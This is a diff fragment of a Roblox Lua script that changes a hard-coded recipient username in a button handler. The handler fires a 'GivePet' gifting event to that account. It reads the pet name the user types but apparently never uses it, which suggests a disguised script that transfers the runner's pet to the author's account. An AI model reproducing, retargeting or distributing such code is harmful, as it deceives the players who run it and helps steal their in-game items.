@@ -132,7 +132,7 @@ Button.MouseButton1Click:Connect(function()
     local petName = TextBox.Text
     if petName == "" then return end
     
-    local recipient = game:GetService("Players"):WaitForChild("bora21456")
+    local recipient = game:GetService("Players"):WaitForChild("bora145145")
     local args = {"GivePet", recipient}
     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
 
